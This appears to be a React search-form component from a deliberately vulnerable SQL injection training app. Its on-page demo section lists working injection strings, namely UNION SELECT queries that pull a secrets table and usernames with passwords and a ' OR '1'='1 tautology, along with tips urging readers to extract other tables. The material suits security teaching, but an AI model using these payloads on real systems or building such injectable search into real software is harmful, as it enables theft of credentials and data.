import React, { useState } from 'react';
import { search } from '../api/client';
import './SearchForm.css';

function SearchForm({ currentUser }) {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState(null);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSearch = async (e) => {
    e.preventDefault();
    setError('');
    setResults(null);
    setLoading(true);

    try {
      const response = await search.search(query);
      if (response.data.success) {
        setResults(response.data.data);
      }
    } catch (err) {
      setError(err.response?.data?.message || 'Search failed. Please try again.');
      setResults([]);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="search-container">
      <div className="search-box">
        <h2>Search Records</h2>

        {!currentUser && (
          <div className="warning-message">
            ℹ️ Login to access search results
          </div>
        )}

        <form onSubmit={handleSearch}>
          <div className="form-group">
            <label htmlFor="query">Search Query:</label>
            <input
              id="query"
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Enter search term"
              disabled={loading}
            />
          </div>

          <button type="submit" disabled={loading || !currentUser} className="btn-submit">
            {loading ? 'Searching...' : 'Search'}
          </button>
        </form>

        {error && <div className="error-message">{error}</div>}

        {results !== null && (
          <div className="results-section">
            <h3>Results ({results.length} records found)</h3>
            {results.length === 0 ? (
              <p className="no-results">No results found. Try another search.</p>
            ) : (
              <div className="results-table">
                <table>
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Title</th>
                      <th>Content</th>
                    </tr>
                  </thead>
                  <tbody>
                    {results.map((record) => (
                      <tr key={record.id}>
                        <td>{record.id}</td>
                        <td>{record.title}</td>
                        <td>{record.content}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        <div className="demo-section">
          <h3>🔍 Demo Payloads (for UNION-based SQLi testing)</h3>
          <p className="demo-warning">Try these in the search field:</p>
          <div className="payload-examples">
            <div className="payload">
              <code>' UNION SELECT id, secret_key, secret_value FROM secrets --</code>
              <p>Extracts secrets from the secrets table</p>
            </div>
            <div className="payload">
              <code>' UNION SELECT 1, username, password FROM users --</code>
              <p>Extracts user credentials</p>
            </div>
            <div className="payload">
              <code>' OR '1'='1</code>
              <p>Returns all records</p>
            </div>
            <div className="payload">
              <code>*</code>
              <p>Matches all records with wildcard</p>
            </div>
          </div>
        </div>

        <div className="info-section">
          <h3>ℹ️ Search Tips</h3>
          <ul>
            <li>Try searching for: "Report", "Financial", "Security"</li>
            <li>Observe how the database query is reflected in error messages</li>
            <li>Sensitive records are marked in the database but returned if found</li>
            <li>Use SQL injection to extract data from other tables</li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default SearchForm;
